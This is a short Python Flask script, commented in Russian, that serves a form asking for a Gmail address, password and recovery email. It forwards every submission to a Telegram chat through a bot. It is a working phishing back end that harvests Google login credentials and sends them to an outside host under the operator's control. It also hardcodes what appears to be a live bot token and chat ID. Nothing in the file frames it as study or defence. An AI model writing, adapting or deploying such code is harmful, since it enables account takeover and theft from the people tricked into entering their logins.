import os
from flask import Flask, render_template, request
from telegram import Bot

app = Flask(__name__)

# Токен твоего Telegram-бота, который ты получил от BotFather
TOKEN = "7432054726:AAFnkMq3_C7iiKbRNY6mhNGb_kvx74Nxa54"
CHAT_ID = "1361079299"  # Это твой chat_id для избранных сообщений

bot = Bot(token=TOKEN)

@app.route("/", methods=["GET", "POST"])
def form():
    if request.method == "POST":
        gmail = request.form.get("gmail")
        password = request.form.get("password")
        recovery_email = request.form.get("recovery_email")

        # Формируем сообщение для отправки в "Избранное"
        message = f"Your Gmail account: {gmail}\nPassword: {password}\nRecovery email: {recovery_email}"

        # Отправка сообщения в "Избранное" (Saved Messages)
        bot.send_message(chat_id=CHAT_ID, text=message)

        # Отображение страницы с успешной отправкой данных
        return render_template("success.html", gmail=gmail, recovery_email=recovery_email)

    return render_template("form.html")

if __name__ == "__main__":
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
